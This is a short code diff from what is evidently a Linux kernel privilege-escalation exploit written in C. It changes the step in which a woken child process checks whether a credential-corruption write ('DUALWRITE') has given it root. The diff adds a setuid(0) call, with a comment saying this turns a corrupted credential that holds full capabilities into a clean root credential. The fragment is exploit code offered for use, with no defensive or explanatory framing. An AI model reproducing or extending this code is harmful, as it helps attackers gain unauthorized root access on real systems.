@@ -1749,9 +1749,13 @@ static void child_spin_until_cmd(int cmd_r, char *cmd) {
         while (*flag == 0)
           __asm__ volatile("yield");
         __sync_synchronize();
+        /* DUALWRITE wake: subjective cred may be init_cred with a
+         * corrupted uid but FULL caps — setuid(0) (CAP_SETUID) mints
+         * a clean root cred. Plain landings: getuid already 0. */
+        setuid(0);
         if ((uint32_t)getuid() == 0)
           break; /* subjective root confirmed by the woken child itself */
-        *flag = 0; /* stage-1 (status-only): re-arm and keep spinning */
+        *flag = 0; /* not root yet: re-arm and keep spinning */
       }
       *cmd = 'G';
       return;
